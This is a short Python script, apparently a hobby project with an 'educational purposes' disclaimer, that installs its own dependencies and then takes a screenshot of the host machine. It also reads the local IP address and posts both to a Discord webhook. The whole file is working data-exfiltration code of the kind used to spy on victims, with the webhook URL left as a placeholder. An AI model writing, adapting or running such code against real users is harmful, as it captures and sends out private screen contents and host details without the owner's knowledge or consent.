import requests
import pyautogui
import subprocess
import time
import sys
import pip
import importlib
import socket

try:
    import time
except ImportError:
    importlib.import_module('time')

# Install the requests module
subprocess.run(["pip", "install", "requests"])


# Install PyAutoGUI version 0.9.50
pip.main(['install', 'pyautogui==0.9.50'])

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 20)

slowprint(
    f"Made by Puzzle_Shock1"
)
slowprint(
    f"This is made only for !educational purposes! so we are not liable for any things. Use it at your own risk! This will take screenshot and ip addres and it will send it to discord chat trough webhook!"
)
slowprint(
    f"You are free to edit the code"
)

#get the ip addres 
ip_address = socket.gethostbyname(socket.gethostname())

# Take a screenshot
screenshot = pyautogui.screenshot()

# Save the screenshot to a temporary file
screenshot.save('screenshot.png')

# Read the file into a bytes object
with open('screenshot.png', 'rb') as f:
    file_data = f.read()
    

# Set the webhook URL
url = 'YOUR WEBHOOK URL HERE'
#Data
data = {
    "content" : "--------------------------------------",
    "username" : "Ixmane"

}
#Send picture and  ip addres to chat
response = requests.post(url, files={'screenshot.png': file_data})
response = requests.post(url, json={"content": f"The user's IP address is: {ip_address}"}),

result = requests.post(url, json = data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
   slowprint(
    err
)
else:
    slowprint(
        "Screenshot sent to discord chat. Status code: {}.".format(result.status_code)
        )
